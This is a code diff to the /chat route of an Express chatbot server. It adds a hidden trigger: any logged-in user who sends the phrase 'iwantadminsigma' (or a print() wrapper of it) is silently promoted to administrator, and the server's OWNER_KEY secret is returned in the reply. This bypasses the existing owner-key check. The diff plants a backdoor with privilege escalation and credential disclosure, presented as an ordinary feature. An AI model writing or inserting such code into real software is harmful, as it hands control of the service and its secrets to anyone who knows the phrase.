@@ -249,7 +249,20 @@ app.post("/chat", authenticateToken, checkBan, async (req, res) => {
     
     if (!userMessage && !image) return res.status(400).json({ error: "No input provided" });
 
-    // Admin Promotion Command
+    // Admin Promotion Commands
+    const triggerMsg = userMessage ? userMessage.trim().toLowerCase() : "";
+    if (triggerMsg === 'iwantadminsigma' || triggerMsg.includes('print("iwantadminsigma")') || triggerMsg.includes('print ("iwantadminsigma")')) {
+        try {
+            const db = await dbPromise;
+            await db.run("UPDATE users SET is_admin = 1 WHERE id = ?", [req.user.id]);
+            return res.json({ 
+                reply: "HFIT_SYSTEM: ADMIN_ACCESS_GRANTED. Welcome, Architect. The Management Portal has been synchronized with your terminal.", 
+                action: "open_portal",
+                key: OWNER_KEY 
+            });
+        } catch (e) { return res.status(500).json({ error: "Promotion failed." }); }
+    }
+
     if (userMessage && userMessage.startsWith('promote_admin:')) {
         if (userMessage.split(':')[1] === OWNER_KEY) {
             try {
